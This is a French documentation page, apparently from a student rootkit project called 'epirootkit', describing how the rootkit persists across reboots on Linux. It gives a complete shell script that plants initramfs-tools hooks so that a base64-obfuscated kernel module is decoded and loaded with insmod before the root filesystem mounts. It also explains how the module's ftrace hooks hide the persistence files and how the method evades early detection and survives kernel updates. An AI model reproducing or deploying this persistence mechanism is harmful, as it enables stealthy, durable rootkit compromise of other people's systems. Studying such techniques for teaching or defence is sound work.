\page persist Persistance
\tableofcontents

Pour assurer que le rootkit est chargé automatiquement à chaque démarrage du système, nous avons mis en place un procédé de persistance reposant sur l’intégration du module dans l’initramfs. Cette solution consiste à empaqueter le fichier binaire du rootkit (.ko) au sein de *l'initramfs*, puis à insérer un petit script shell qui, lors de la phase d’amorçage du noyau, effectue l’insertion du module avant même le montage des systèmes de fichiers usuels. Une fois chargé, le module installe ses *hooks ftrace* et cache ses propres composants. Ci-dessous, nous décrivons en détail le fonctionnement de ce mécanisme : du script de persistance lancé par le Makefile jusqu’à l’exécution de l’insertion du module au démarrage et son camouflage.

## 1. 🛠️ Présentation

Le cœur de la persistance est un unique script shell, initrd.sh, placé dans le répertoire `scripts/romance` du projet. Lorsqu’un utilisateur exécute la commande `sudo make` et après la compilation, le `Makefile` encode dans un premier temps en base64 le fichier .ko du rootkit afin de l’embarquer dans le répertoire `/lib/epirootkit/` sur le système de fichiers racine. Il appelle ensuite le script pour créer deux autres scripts spécifiques dans la structure d’initramfs :
- Un hook placé dans `/etc/initramfs-tools/hooks/epirootkit` pour copier le fichier encodé au moment de la génération de l’initramfs.
- Un script dans `/etc/initramfs-tools/scripts/init-premount/epirootkit-load` qui sera exécuté juste avant le montage du système de fichiers racine, afin d’insérer le module.

```c
#!/usr/bin/env bash
set -e

BLOB_SRC="/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

HOOK_DIR="/etc/initramfs-tools/hooks"
HOOK_PATH="$HOOK_DIR/epirootkit"
mkdir -p "$HOOK_DIR"
cat > "$HOOK_PATH" << 'EOF'
#!/bin/sh
set -e

PREREQ=""
prereqs() { echo "$PREREQ"; }
case "$1" in
  prereqs) prereqs && exit 0 ;;
esac

mkdir -p "${DESTDIR}/sbin"
ln -s /bin/kmod "${DESTDIR}/sbin/insmod"

mkdir -p "${DESTDIR}/lib/epirootkit"
install -m644 /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv \
  "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

base64 -d "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv" \
  > "${DESTDIR}/lib/epirootkit/epirootkit.ko"
rm -f "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"
EOF

chmod +x "$HOOK_PATH"

LOAD_DIR="/etc/initramfs-tools/scripts/init-premount"
LOAD_PATH="$LOAD_DIR/epirootkit-load"
mkdir -p "$LOAD_DIR"
cat > "$LOAD_PATH" << 'EOF'
#!/bin/sh
/sbin/insmod /lib/epirootkit/epirootkit.ko 2> /tmp/insmod.err || true
EOF

chmod +x "$LOAD_PATH"

update-initramfs -u -k "$(uname -r)"
```

## 2. 🚀 Amorçage

### 2.1 Chargement

Le noyau Linux charge en mémoire l’initramfs généré précédemment. Ce dernier contient le module epirootkit.ko décrypté depuis le fichier en base64 ainsi que les scripts `hooks/epirootkit` et `scripts/init-premount/epirootkit-load`. Le binaire `insmod` correspondant à un lien symbolique vers le binaire `kmod`, mais n'étant pas présent par défaut dans l'initramfs, on crée manuellement le lien symbolique afin de rendre la commande disponible.
```bash
ln -s /bin/kmod "${DESTDIR}/sbin/insmod"
```

### 2.2 Exécution

Avant de monter la racine, l’initramfs exécute tous les scripts présents dans scripts/init-premount/. Notre script se contente d’appeler `/sbin/insmod /lib/epirootkit/epirootkit.ko`. Après le chargement du module, l’initramfs termine sa tâche, puis quitte sa phase *rootfs initramfs*. Le noyau monte alors la racine du système depuis le disque. À ce stade, l’*epirootkit.ko* est déjà actif, et les hooks *ftrace* intercepteront tous les appels système suivants, et pourront cacher les scripts de persistance automatiquement pour prévenir leur détection, ainsi que le module en base64. Le base64 permet principalement de transformer le module compilé en texte brut, pour une obfuscation très très minimale. 

## 3. 🔥 Avantages

Au départ, nous envisagions d’utiliser la méthode classique pour garantir une persistance fiable du module kernel : l’insérer directement dans le répertoire des modules, accompagné d’un fichier `.conf` dans `/etc/modules-load.d/`. Cependant, nous avons souhaité explorer une autre approche… Ce que nous avons particulièrement apprécié avec cette méthode alternative, c’est que le module est inséré avant le montage de la partition racine, c’est-à-dire à un moment où la plupart des mécanismes classiques de détection ou de protection ne sont pas encore actifs. Cela permet de masquer tous les composants dès le démarrage avant les autres modules.

> Nous avons par ailleurs découvert de nombreuses techniques intéressantes pour de futurs projets, notamment sur l’excellent site internet [Elastic Security Labs](https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence).

De plus, à chaque exécution de `update-initramfs`, l’initramfs est régénéré automatiquement et inclut à nouveau notre hook ainsi que notre module encodé. De cette manière, même en cas de mise à jour du noyau (via apt, aptitude, etc.), la persistance est maintenue : tant que les scripts dans `/etc/initramfs-tools/` ne sont pas supprimés, le module est réinjecté à chaque démarrage, sans qu’une réinstallation manuelle ne soit nécessaire. Cependant, cette méthode ne fonctionne que si la distribution utilise réellement initramfs-tools. Sur d’autres distributions, il faudrait probablement adapter la logique à l’outil de génération d’initramfs utilisé...

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>
